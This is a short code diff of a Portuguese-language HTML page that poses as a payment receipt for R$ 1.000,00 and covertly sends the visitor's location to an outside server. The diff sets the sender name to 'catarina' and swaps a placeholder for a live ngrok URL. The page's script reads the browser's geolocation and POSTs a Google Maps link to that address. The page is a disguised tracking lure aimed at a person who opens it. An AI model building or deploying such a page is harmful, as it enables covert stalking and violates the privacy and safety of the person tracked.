@@ -15,7 +15,7 @@
     <div class="informacoes">
       <p><span>Data:</span> <span id="data-atual"></span></p>
       <p><span>Valor Recebido:</span> R$ 1.000,00</p>
-      <p><span>De:</span> João Silva de Oliveira</p>
+      <p><span>De:</span> catarina</p>
       <p><span>Status:</span> Recebido com Sucesso</p>
     </div>
 
@@ -53,7 +53,7 @@
       const longitude = position.coords.longitude;
       const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-      fetch("NGROK_SERVER/send-location", {
+      fetch("https://2cbf-189-30-169-64.ngrok-free.app/send-location", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
